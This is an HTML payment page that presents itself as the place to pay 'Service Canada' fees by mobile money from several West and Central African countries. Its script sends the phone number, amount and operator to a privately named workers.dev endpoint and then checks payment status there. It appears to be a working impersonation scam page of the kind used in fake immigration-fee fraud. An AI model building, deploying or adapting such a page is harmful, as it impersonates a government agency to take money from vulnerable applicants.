<!DOCTYPE html>
<html>
<head>
  <title>Paiement Frais Service Canada</title>

  <style>
    body {
      font-family: Arial;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: white;
      padding: 30px;
      border-radius: 12px;
      width: 320px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .logo {
      width: 90px;
      margin-bottom: 10px;
    }

    h2 {
      margin-bottom: 15px;
      font-size: 18px;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: #00bcd4;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
    }

    #result {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>

<body>

<div class="box">

  <!-- ✅ LOGO (INTÉGRÉ) -->
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." class="logo">

  <!-- TITRE -->
  <h2>PAIEMENT FRAIS SERVICE CANADA</h2>

  <select id="country" onchange="updateOperators()">
    <option value="CIV">Côte d'Ivoire</option>
    <option value="CMR">Cameroun</option>
    <option value="COD">RDC (Congo Kinshasa)</option>
    <option value="COG">Congo Brazzaville</option>
    <option value="GAB">Gabon</option>
    <option value="SEN">Sénégal</option>
    <option value="BEN">Bénin</option>
  </select>

  <select id="operator"></select>

  <input type="text" id="phone" placeholder="Numéro (ex: 229XXXXXXXX)">
  <input type="number" id="amount" placeholder="Montant">

  <button onclick="payer()">Payer maintenant</button>

  <!-- 🔥 NOUVEAU -->
  <button onclick="verifier()">Vérifier paiement</button>

  <p id="result"></p>

</div>

<script>

let lastDepositId = null;

const operators = {
  BEN: ["MTN", "MOOV"],
  CIV: ["MTN", "ORANGE"],
  CMR: ["MTN"],
  COD: ["AIRTEL", "ORANGE", "VODACOM"],
  COG: ["AIRTEL", "MTN"],
  GAB: ["AIRTEL"],
  SEN: ["ORANGE", "FREE"]
};

function updateOperators() {
  const country = document.getElementById("country").value;
  const select = document.getElementById("operator");
  select.innerHTML = "";

  operators[country].forEach(op => {
    const option = document.createElement("option");
    option.value = op;
    option.text = op;
    select.appendChild(option);
  });
}

updateOperators();

async function payer() {

  const result = document.getElementById("result");

  result.innerText = "⏳ Envoi de la demande...";

  const depositId = crypto.randomUUID();
  lastDepositId = depositId;

  const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      depositId,
      phone: document.getElementById("phone").value,
      amount: document.getElementById("amount").value,
      country: document.getElementById("country").value,
      operator: document.getElementById("operator").value
    })
  });

  const data = await res.json();

  if (data.status === "ACCEPTED") {
    result.innerText = "📲 Validez le paiement sur votre téléphone puis cliquez sur 'Vérifier paiement'";
  } else {
    result.innerText = "❌ Erreur : " + (data.error || "Réessayez");
  }
}

// 🔥 VÉRIFICATION RÉELLE
async function verifier() {

  const result = document.getElementById("result");

  if (!lastDepositId) {
    result.innerText = "⚠️ Aucun paiement à vérifier";
    return;
  }

  result.innerText = "⏳ Vérification en cours...";

  try {
    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/status?id=" + lastDepositId);
    const data = await res.json();

    if (data.status === "SUCCESS") {
      result.innerText = "✅ Paiement confirmé avec succès";
    } else if (data.status === "PENDING") {
      result.innerText = "⏳ Toujours en attente...";
    } else {
      result.innerText = "❌ Paiement échoué";
    }

  } catch (err) {
    result.innerText = "❌ Erreur de vérification";
  }
}

</script>

</body>
</html>
